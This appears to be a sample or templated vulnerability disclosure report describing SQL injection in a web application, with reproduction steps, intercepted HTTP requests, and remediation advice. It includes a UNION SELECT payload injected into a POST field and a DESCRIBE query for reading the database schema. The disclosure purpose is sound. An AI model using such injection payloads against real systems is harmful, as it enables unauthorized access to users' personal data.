# SQL Injection - bitexen.com

## Researcher Information

Hello, I am Zeynep. You can access me at zeynep@example.com. My HackerOne account is "zeynep".

## Issue Description and Summary

I malformed the requests of the web page with Burp to successfully run SQL queries. I checked the table schemas in the database but did not access any data thinking there could be sensitive information there. There was column names like account e-mail and phone number.

## Affected URLs / Applications

- Domain bitexen.com

## Risk Category

- Risk: Critical
- Risk: Disclosure of sensitive user information (national identity, physical address, phone number)
- CVSS v3 score: 9.8 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Steps to Reproduce / PoC

- Login to your Bitexen account, change account details, press "Save"
- Intercept the request with Burp or other proxy tools
- Change the POST data of the request from `username=example` to `username=example' UNION SELECT sum(columnname ) from tablename --`
- Send the request and watch the response

- Original request

        POST https://bitexen.com/application/path HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
        Host: bitexen.com
        Content-Type: text/xml; charset=utf-8
        X-BTXN-VDP: example@example.com
        .
        .
        .

        data

- Original response

        HTTP/1.1 200 OK
        Server: nginx
        Content-Type: text/html; charset=utf-8
        Vary: Accept-Encoding
        .
        .
        .

        OK

- Malformed request

        POST https://bitexen.com/application/path HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
        Host: bitexen.com
        Content-Type: text/xml; charset=utf-8
        X-BTXN-VDP: example@example.com
        .
        .
        .

        data' UNION SELECT sum(columnname ) from tablename --

- Response for malformed request

        HTTP/1.1 200 OK
        Server: nginx
        Content-Type: text/html; charset=utf-8
        Vary: Accept-Encoding
        .
        .
        .

        5

- This time, the same request is sent by entering `DESCRIBE bitexen_db.users`. It can be seen that the database and the tables can be accessed.

        +-------+--------------+------+-----+---------+-------+
        | Field | Type         | Null | Key | Default | Extra |
        +-------+--------------+------+-----+---------+-------+
        | id    | int(11)      | YES  | MUL | NULL    |       |
        | Name  | varchar(100) | YES  | MUL | NULL    |       |
        +-------+--------------+------+-----+---------+-------+
        2 rows in set (0.05 sec)

Screeshots:

- Screenshot 1
- Screenshot 2

## Impact

An attacker can access sensitive user information. It is not possible to hijack user accounts due to no passwords seem to be in the database but the information which can be accessed is critical. The data can also be edited or deleted by the attacker.

## Remediation Suggestions / Supporting Material / References

Instead of creating SQL queries from the user input, parameterized API can be used. If this option is not feasible, the user input must be sanitized before creating SQL queries. Also, the permissions of the SQL service and account should be limited.

Resources:

- <https://www.w3schools.com/sql/sql_injection.asp>
- <https://portswigger.net/web-security/sql-injection>
- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://www.acunetix.com/websitesecurity/sql-injection/>
